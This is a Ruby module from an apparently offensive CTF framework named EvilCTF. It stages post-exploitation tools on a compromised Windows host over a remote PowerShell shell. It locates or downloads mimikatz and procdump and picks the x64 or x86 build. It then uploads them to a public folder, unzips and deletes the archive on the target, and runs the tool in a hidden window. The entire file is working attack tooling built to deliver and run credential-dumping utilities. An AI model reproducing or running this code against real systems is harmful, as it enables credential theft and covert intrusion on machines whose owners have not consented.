# frozen_string_literal: true

module EvilCTF
  module Tools
    module Stager
      module_function

      def safe_autostage(tool_key, shell, options, logger, registry:, download_tool_proc:)
        tool = registry[tool_key]
        return false unless tool

        needs_extraction = tool[:zip] && (tool[:zip_pick] || tool[:zip_pick_x64] || tool[:zip_pick_x86])
        remote_path = tool[:recommended_remote]

        if needs_extraction
          extracted_file = nil

          if tool[:zip_pick_x64] && get_system_architecture(shell) == 'x64'
            extracted_file = tool[:zip_pick_x64].split('/').last
          elsif tool[:zip_pick_x86] && get_system_architecture(shell) == 'x86'
            extracted_file = tool[:zip_pick_x86].split('/').last
          elsif tool[:zip_pick]
            extracted_file = tool[:zip_pick].split('/').last
          end

          if extracted_file && !File.extname(extracted_file).empty?
            located_path = locate_extracted_remote_path(shell, tool[:recommended_remote], extracted_file)
            if located_path
              puts "[+] #{tool[:name]} already staged at #{located_path}"
              return true
            end
          end
        end

        arch = get_system_architecture(shell)
        puts "[*] System architecture: #{arch}"
        adjusted_tool = tool.dup

        if tool_key == 'procdump'
          if arch == 'x64'
            adjusted_tool[:filename] = 'procdump64.exe'
            adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump64.exe'
          else
            adjusted_tool[:filename] = 'procdump.exe'
            adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump.exe'
          end
        elsif tool_key == 'mimikatz' && tool[:zip]
          adjusted_tool[:zip_pick] = (arch == 'x64') ? tool[:zip_pick_x64] : tool[:zip_pick_x86]
        end

        local_path = find_tool_on_disk(tool_key, registry: registry)
        unless local_path && File.exist?(local_path)
          puts "[!] Local #{adjusted_tool[:filename]} not found. Attempting download..."
          local_path = download_tool_proc.call(tool_key)
          return false unless local_path && File.exist?(local_path)
        end

        if needs_extraction
          zip_remote_path = tool[:recommended_remote]

          if adjusted_tool[:zip_pick] && !tool[:zip_pick_x64] && !tool[:zip_pick_x86]
            zip_remote_path = File.extname(tool[:recommended_remote]).empty? ? "#{tool[:recommended_remote]}.zip" : tool[:recommended_remote]
          elsif tool[:zip_pick_x64] || tool[:zip_pick_x86]
            zip_remote_path = tool[:recommended_remote]
          end

          puts "[*] Staging ZIP file #{adjusted_tool[:filename]} to #{zip_remote_path}"

          success = EvilCTF::Uploader.upload_file(local_path: local_path, remote_path: zip_remote_path, shell: shell)
          return false unless success

          extract_root = tool[:recommended_remote].to_s.rpartition('\\').first
          extract_ps = <<~PS
            try {
              $zipPath = '#{EvilCTF::Utils.escape_ps_string(zip_remote_path)}'
              $extractPath = '#{EvilCTF::Utils.escape_ps_string(extract_root)}'

              Add-Type -AssemblyName System.IO.Compression.FileSystem
              [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)

              Remove-Item $zipPath -Force

              "EXTRACTED"
            } catch {
              "ERROR: $($_.Exception.Message)"
            }
          PS

          result = shell.run(extract_ps)
          if result.output.include?('EXTRACTED')
            puts '[+] ZIP extracted successfully on target'
            return true
          end

          extracted_file = adjusted_tool[:zip_pick]&.split('/')&.last
          located_path = if extracted_file && !File.extname(extracted_file).empty?
                           locate_extracted_remote_path(shell, tool[:recommended_remote], extracted_file)
                         end
          if located_path
            puts "[+] ZIP content already present at #{located_path}"
            return true
          end

          puts "[!] ZIP extraction failed: #{result.output}"
          return false
        end

        puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
        EvilCTF::Uploader.upload_file(local_path: local_path, remote_path: remote_path, shell: shell)
      rescue StandardError => e
        puts "[!] Staging failed for #{tool_key}: #{e.message}"
        false
      end

      def execute_staged_tool(key, args = '', shell, registry:)
        tool = registry[key]
        return false unless tool

        remote_path = tool[:recommended_remote]
        begin
          puts "[*] Executing #{key} with args: #{args}"
          ps_cmd = <<~PS
            try {
              $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -ArgumentList '#{EvilCTF::Utils.escape_ps_string(args)}' -PassThru -WindowStyle Hidden
              $proc.WaitForExit(60000) | Out-Null
              if ($proc.HasExited) {
                "Completed with exit code: $($proc.ExitCode)"
              } else {
                "Timed out after 60 seconds"
                $proc.Kill()
              }
            } catch {
              "Error: $_.Exception.Message"
            }
          PS
          result = shell.run(ps_cmd)
          puts result.output
          true
        rescue StandardError => e
          puts "[!] Execution failed for #{key}: #{e.message}"
          false
        end
      end

      def locate_extracted_remote_path(shell, recommended_remote, extracted_file)
        return nil if extracted_file.nil? || extracted_file.empty?

        search_root = recommended_remote.to_s.rpartition('\\').first
        search_root = EvilCTF::Utils.escape_ps_string(search_root)
        target_name = EvilCTF::Utils.escape_ps_string(extracted_file)
        locate_cmd = <<~PS
          $match = Get-ChildItem -Path '#{search_root}' -Filter '#{target_name}' -Recurse -ErrorAction SilentlyContinue |
            Select-Object -First 1 -ExpandProperty FullName
          if ($match) { "FOUND::$match" } else { 'MISSING' }
        PS

        result = shell.run(locate_cmd)
        found_line = result.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
        found_line&.sub('FOUND::', '')&.strip
      rescue StandardError => e
        puts "[!] Remote extracted-path lookup failed: #{e.message}"
        nil
      end

      def find_tool_on_disk(tool_key, registry:)
        tool = registry[tool_key]
        return nil unless tool

        search_patterns = tool[:search_patterns] || [tool[:filename]]
        base_dirs = [
          ENV['HOME'],
          File.join(ENV['HOME'], 'Downloads'),
          File.join(ENV['HOME'], 'Desktop'),
          File.join(ENV['HOME'], 'tools'),
          File.join(ENV['HOME'], 'bin'),
          Dir.pwd,
          File.join(Dir.pwd, 'tools')
        ].compact.uniq

        search_patterns.each do |pattern|
          base_dirs.each do |base|
            next unless Dir.exist?(base)

            Dir.glob(File.join(base, '**', pattern), File::FNM_CASEFOLD).each do |path|
              return path if File.file?(path)
            end
          end
        end
        nil
      end

      def get_system_architecture(shell)
        result = shell.run('$env:PROCESSOR_ARCHITECTURE')
        arch = result.output.strip

        if arch.include?('64')
          'x64'
        elsif arch.include?('86')
          'x86'
        else
          'unknown'
        end
      end
    end
  end
end
